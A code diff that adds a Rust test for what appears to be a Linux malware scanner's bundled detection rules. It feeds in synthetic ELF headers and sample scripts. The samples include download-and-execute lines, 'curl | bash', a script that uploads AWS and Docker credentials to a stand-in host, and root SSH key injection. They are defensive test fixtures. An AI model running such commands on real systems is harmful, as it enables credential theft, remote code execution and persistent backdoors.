@@ -274,6 +274,102 @@ rule Linux_Hacktool_Socat { condition: elf.type == elf.ET_EXEC }
         );
     }
 
+    /// Strings that ELF rules look for are kept reversed here and turned
+    /// around at run time: written plainly they would sit in this test
+    /// binary — an ELF — and on-access scanning would flag it as it's built.
+    fn r(s: &str) -> String {
+        s.chars().rev().collect()
+    }
+
+    /// A minimal 64-bit little-endian ELF header of type `e_type` (1 =
+    /// relocatable, i.e. a kernel module), followed by `strings`.
+    fn elf(e_type: u8, strings: &[String]) -> Vec<u8> {
+        let mut e = vec![0u8; 64];
+        e[..4].copy_from_slice(b"\x7fELF");
+        (e[4], e[5], e[6]) = (2, 1, 1);
+        e[16] = e_type;
+        e[18] = 62; // x86-64
+        e[20] = 1;
+        e[52] = 64; // header size
+        for s in strings {
+            e.push(0);
+            e.extend_from_slice(s.as_bytes());
+        }
+        e
+    }
+
+    #[test]
+    fn bundled_rules_catch_their_families() {
+        let rules = bundled();
+        let name = |data: &[u8]| rules.scan(data).map(|m| m.name);
+        let cases: Vec<(&str, Vec<u8>)> = vec![
+            ("Qlam.Linux.Botnet.Tsunami", elf(2, &[r("ukarog aw netiaK")])),
+            ("Qlam.Linux.Botnet.XorDDoS", elf(2, &[r("dip.ccg/nur/rav/"), r("os.vedubil/bil/")])),
+            ("Qlam.Linux.Botnet.Mozi", elf(2, &[r("]ss["), r("]ph["), r("]pid["), r("moc.tbnoissimsnart.thd")])),
+            ("Qlam.Linux.Backdoor.BPFDoor", elf(2, &[r("hsulfpmtmdk/mhs/ved/")])),
+            ("Qlam.Linux.Rootkit.LKM", elf(1, &[r("terces_enihpromaid")])),
+            (
+                "Qlam.Linux.Rootkit.LKM.Generic",
+                elf(1, &[r("eman_pukool_smysllak"), r("elbat_llac_sys"), r("dip_edih")]),
+            ),
+            ("Qlam.Linux.HackTool.Sliver", elf(2, &[r("bprevils/fubotorp/revils/xofpohsib/moc.buhtig"), r("epolevnE.bprevils")])),
+            ("Qlam.Linux.HackTool.Mimipenguin", elf(2, &[r("niugnepimim"), r("wodahs/cte/"), r(":dhss")])),
+            (
+                "Qlam.Linux.Downloader.BotLoader",
+                b"cd /tmp || cd /var/run\nwget http://1.2.3.4/bins/mips; chmod 777 mips; ./mips\n\
+                  wget http://1.2.3.4/bins/arm7; chmod 777 arm7; ./arm7\nwget http://1.2.3.4/bins/x86; chmod 777 x86; ./x86\n"
+                    .to_vec(),
+            ),
+            (
+                "Qlam.Linux.Miner.Kinsing",
+                b"#!/bin/sh\nwget -q http://1.2.3.4/kinsing -O /tmp/kinsing\nchmod +x /tmp/kinsing\npkill kdevtmpfsi\n".to_vec(),
+            ),
+            ("Qlam.Linux.Miner.TeamTNT", b"#!/bin/bash\n# TeamTNT\ncurl -s http://x.example/a | bash\n".to_vec()),
+            (
+                "Qlam.Linux.Stealer.CloudCredentials",
+                b"#!/bin/sh\ncat ~/.aws/credentials ~/.docker/config.json > /tmp/c\ncurl -F \"f=@/tmp/c\" http://x.example/up\n".to_vec(),
+            ),
+            (
+                "Qlam.PUA.Linux.Miner.Config",
+                br#"{"donate-level": 1, "pools": [{"url": "pool.example.org:3333", "user": "x"}]}"#.to_vec(),
+            ),
+            (
+                "Qlam.Linux.Backdoor.SshKeyInjector",
+                format!(
+                    "#!/bin/sh\necho \"ssh-rsa AAAA{} x@y\" >> /root/.ssh/authorized_keys\nchattr +i /root/.ssh/authorized_keys\n",
+                    "B".repeat(80)
+                )
+                .into_bytes(),
+            ),
+            (
+                "Qlam.Perl.Backdoor.ShellBot",
+                b"#!/usr/bin/perl\nuse IO::Socket::INET;\nmy @adms=(\"x\");\nmy @canais=(\"#c\");\nprint $s \"PRIVMSG #c :hi\";\n".to_vec(),
+            ),
+            ("Qlam.PHP.Webshell.Known", b"<?php\n$default_action = 'FilesMan';\n".to_vec()),
+        ];
+        for (expected, data) in &cases {
+            assert_eq!(name(data).as_deref(), Some(*expected), "sample for {expected}");
+        }
+
+        // Look-alikes that must stay clean.
+        let clean: Vec<(&str, Vec<u8>)> = vec![
+            ("a torrent client", elf(2, &[r("moc.tbnoissimsnart.thd"), r("moc.tnerrottib.retuor")])),
+            ("a security module", elf(1, &[r("eman_pukool_smysllak"), r("elbat_llac_sys")])),
+            ("an executable, not a module", elf(2, &[r("terces_enihpromaid")])),
+            ("two architectures", b"wget http://h/x86; chmod +x x86\nwget http://h/arm7\n".to_vec()),
+            (
+                "provisioning a key",
+                format!("#!/bin/sh\necho \"ssh-ed25519 AAAA{} me\" >> ~/.ssh/authorized_keys\n", "C".repeat(64)).into_bytes(),
+            ),
+            ("a backup script", b"#!/bin/sh\ntar czf /backup/aws.tgz ~/.aws/credentials ~/.kube/config\n".to_vec()),
+            ("a miner config, as documentation", b"Set \"donate-level\" and \"pools\" with stratum+tcp://...".to_vec()),
+            ("a note about webshells", b"# Webshells we saw: FilesMan ($default_action), b374k, c99shell\n".to_vec()),
+        ];
+        for (what, data) in &clean {
+            assert_eq!(name(data), None, "{what} was flagged");
+        }
+    }
+
     fn source(rel: &str) -> String {
         std::fs::read_to_string(Path::new(env!("CARGO_MANIFEST_DIR")).join(rel)).unwrap()
     }
